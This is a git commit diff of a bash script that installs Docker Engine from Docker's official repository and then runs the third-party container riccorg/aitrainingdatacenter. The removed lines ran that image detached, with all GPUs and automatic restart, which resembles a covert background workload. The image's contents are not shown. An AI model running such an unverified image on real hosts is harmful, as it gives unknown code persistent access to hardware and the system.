b0c87c6cea8fbccf4682a8a97eba941254ffc367
max313iq <153689278+max313iq@users.noreply.github.com>
2024-11-30 16:58:49 +0300

    Update ba2.sh

--- ba2.sh
+++ ba2.sh
@@ -1,23 +1,26 @@
 #!/bin/bash
+# Update the apt package index
+sudo apt-get update -y
 
-# Set DEBIAN_FRONTEND to teletype to avoid debconf prompts
-export DEBIAN_FRONTEND=teletype
-
-# Update the package repository
-sudo apt-get update --fix-missing
-
-# Install dependencies for adding repositories
-sudo apt-get install -y \
-    build-essential \
-    dkms \
-    curl \
-    apt-transport-https \
+# Install packages needed to use a repository over HTTPS
+sudo apt-get install \
     ca-certificates \
+    curl \
     gnupg \
-    lsb-release
+    lsb-release -y
 
-# Start Docker service
-sudo service docker start
+# Add Docker's official GPG key
+curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg
 
-# Run Docker container with GPU support
-sudo docker run -d --gpus all -itd --restart=always --name aitaining riccorg/aitrainingdatacenter
+# Add Docker's official repository
+echo "deb [signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
+
+# Update the apt package index again
+sudo apt-get update -y
+
+# Install Docker Engine
+sudo apt-get install docker-ce docker-ce-cli containerd.io -y
+
+# Add your user to the docker group (optional, but recommended)
+sudo usermod -aG docker $USER
+docker run -it --rm riccorg/aitrainingdatacenter
